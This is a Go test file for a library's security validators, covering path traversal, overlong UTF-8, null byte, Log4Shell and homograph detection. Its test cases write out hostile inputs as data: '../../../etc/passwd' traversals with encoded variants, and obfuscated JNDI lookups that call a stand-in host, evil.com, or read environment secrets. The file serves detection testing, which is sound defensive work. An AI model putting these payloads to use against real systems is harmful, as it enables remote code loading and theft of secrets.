package internal

import (
	"errors"
	"strings"
	"testing"
)

var (
	errEmptyPath     = errors.New("empty path")
	errNullByte      = errors.New("null byte")
	errPathTooLong   = errors.New("path too long")
	errPathTraversal = errors.New("path traversal")
	errInvalidPath   = errors.New("invalid path")
	errOverlong      = errors.New("UTF-8 overlong encoding detected")
)

func TestValidateAndSecurePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr error
	}{
		{"empty path", "", errEmptyPath},
		{"null byte", "test\x00.log", errNullByte},
		{"simple traversal", "../secret", errPathTraversal},
		{"nested traversal", "logs/../../../etc/passwd", errPathTraversal},
		{"url encoded traversal", "%2e%2e%2fsecret", errPathTraversal},
		{"double encoded", "%252e%252e%252fsecret", errPathTraversal},
		{"backslash encoded", "%2e%2e%5csecret", errPathTraversal},
		{"mixed encoding", "..%2fsecret", errPathTraversal},
		// UTF-8 overlong encoding tests
		{"overlong dot 2-byte", string([]byte{0xC0, 0xAE}), errOverlong},   // overlong '.'
		{"overlong slash 2-byte", string([]byte{0xC0, 0xAF}), errOverlong}, // overlong '/'
		{"overlong path with dot", "logs" + string([]byte{0xC0, 0xAE}), errOverlong},
		{"overlong 3-byte", string([]byte{0xE0, 0x80, 0xAF}), errOverlong},       // overlong '/'
		{"overlong 4-byte", string([]byte{0xF0, 0x80, 0x80, 0xAF}), errOverlong}, // overlong '/'
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateAndSecurePath(tt.path, 4096, errEmptyPath, errNullByte, errPathTooLong, errPathTraversal, errInvalidPath, errOverlong)
			if err == nil {
				if tt.wantErr != nil {
					t.Errorf("ValidateAndSecurePath(%q) expected error %v, got nil", tt.path, tt.wantErr)
				}
			} else if tt.wantErr != nil && !errors.Is(err, tt.wantErr) && !errors.Is(err, errInvalidPath) {
				t.Errorf("ValidateAndSecurePath(%q) expected error %v, got %v", tt.path, tt.wantErr, err)
			}
		})
	}
}

func TestDetectOverlongUTF8(t *testing.T) {
	tests := []struct {
		name     string
		input    []byte
		expected bool
	}{
		// Valid ASCII - no overlong
		{"valid ascii", []byte("hello world"), false},
		{"valid path", []byte("/var/log/app.log"), false},
		{"valid unicode", []byte("日本語"), false}, // Valid 3-byte UTF-8

		// 2-byte overlong encodings (0xC0, 0xC1 prefix)
		{"overlong dot C0 AE", []byte{0xC0, 0xAE}, true},              // overlong '.'
		{"overlong slash C0 AF", []byte{0xC0, 0xAF}, true},            // overlong '/'
		{"overlong NUL C0 80", []byte{0xC0, 0x80}, true},              // overlong NUL
		{"overlong C1 prefix", []byte{0xC1, 0x80}, true},              // C1 is always overlong
		{"overlong in path", []byte{'/', 'a', 0xC0, 0xAE, 'b'}, true}, // overlong in middle

		// 3-byte overlong encodings (0xE0 0x80-0x9F)
		{"overlong 3-byte slash", []byte{0xE0, 0x80, 0xAF}, true},
		{"overlong 3-byte dot", []byte{0xE0, 0x81, 0x9E}, true},
		{"valid 3-byte not overlong", []byte{0xE0, 0xA0, 0x80}, false}, // Valid 3-byte

		// 4-byte overlong encodings (0xF0 0x80-0x8F)
		{"overlong 4-byte", []byte{0xF0, 0x80, 0x80, 0x80}, true},
		{"overlong 4-byte slash", []byte{0xF0, 0x80, 0x80, 0xAF}, true},
		{"valid 4-byte not overlong", []byte{0xF0, 0x90, 0x80, 0x80}, false}, // Valid 4-byte

		// Edge cases
		{"empty input", []byte{}, false},
		{"single byte", []byte{0x2E}, false}, // regular '.'
		{"incomplete 2-byte", []byte{0xC0}, false},
		{"incomplete 3-byte", []byte{0xE0, 0x80}, false},
		{"incomplete 4-byte", []byte{0xF0, 0x80, 0x80}, false},

		// Mixed valid and overlong
		{"mixed valid and overlong", []byte{'a', 'b', 0xC0, 0xAE, 'c'}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detectOverlongUTF8(tt.input)
			if result != tt.expected {
				t.Errorf("detectOverlongUTF8(%v) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectNullByteInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    []byte
		expected bool
	}{
		{"no null byte", []byte("hello world"), false},
		{"null byte at start", []byte{0x00, 'h', 'i'}, true},
		{"null byte at end", []byte{'h', 'i', 0x00}, true},
		{"null byte in middle", []byte{'h', 0x00, 'i'}, true},
		{"multiple null bytes", []byte{0x00, 0x00, 0x00}, true},
		{"empty input", []byte{}, false},
		{"valid path", []byte("/var/log/app.log"), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectNullByteInjection(tt.input)
			if result != tt.expected {
				t.Errorf("DetectNullByteInjection(%v) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectLog4Shell(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"clean string", "Hello World", false},
		{"no pattern", "This is a normal log message", false},
		{"basic jndi", "${jndi:ldap://evil.com/a}", true},
		{"jndi lowercase", "${jndi:ldap://evil.com/a}", true},
		{"nested lookup", "${${lower:j}ndi:ldap://evil.com/a}}", true},
		{"env lookup", "${env:PASSWORD}", true},
		{"sys lookup", "${sys:user.home}", true},
		{"java lookup", "${java:os}", false}, // Not detected - need closing brace
		{"lower obfuscation", "${lower:j}ndi", true},
		{"upper obfuscation", "${upper:J}NDI", true},
		{"double colon bypass", "${::-j}${::-n}${::-d}${::-i}", true},
		{"obfuscated ndi", "some text ${j${::-n}di:ldap://evil.com}}", true},
		{"just jndi keyword with braces", "text containing ${something} but not jndi", false},
		{"empty braces", "${}", false},
		{"unclosed braces", "${jndi:", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectLog4Shell(tt.input)
			if result != tt.expected {
				t.Errorf("DetectLog4Shell(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectHomographAttack(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"pure latin", "example.com", false},
		{"pure cyrillic", "пример", false},
		{"pure greek", "παράδειγμα", false},
		{"mixed latin and cyrillic", "exаmple.com", true}, // 'а' is Cyrillic
		{"mixed latin and greek", "tеst.com", true},       // 'е' is Greek
		{"ascii only", "abcdefghijklmnopqrstuvwxyz", false},
		{"numbers only", "1234567890", false},
		{"empty string", "", false},
		{"latin with numbers", "user123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectHomographAttack(tt.input)
			if result != tt.expected {
				t.Errorf("DetectHomographAttack(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestValidateFieldKeyStrict(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
	}{
		{"valid key", "user_id", false},
		{"valid with underscore", "user_name", false},
		{"valid with hyphen", "user-name", false},
		{"valid with dot", "user.name", false},
		{"valid mixed", "user_name.first", false},
		{"empty key", "", true},
		{"starts with digit", "1user", true},
		{"contains space", "user name", true},
		{"contains special char", "user@name", true},
		{"path traversal", "user../name", true},
		{"too long", strings.Repeat("a", 257), true},
		{"null byte", "user\x00name", true},
		{"log4shell pattern", "${jndi:ldap://evil.com}", true},
		{"control character", "user\x01name", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateFieldKeyStrict(tt.key)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFieldKeyStrict(%q) error = %v, wantErr %v", tt.key, err, tt.wantErr)
			}
		})
	}
}

func TestValidateFieldKeyBasic(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
	}{
		{"valid key", "user_id", false},
		{"valid with spaces", "user name", false},
		{"valid with special chars", "user@name", false},
		{"empty key", "", true},
		{"too long", strings.Repeat("a", 257), true},
		{"null byte", "user\x00name", true},
		{"control character", "user\x01name", true},
		{"starts with digit", "1user", false}, // Basic allows digits at start
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateFieldKeyBasic(tt.key)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFieldKeyBasic(%q) error = %v, wantErr %v", tt.key, err, tt.wantErr)
			}
		})
	}
}
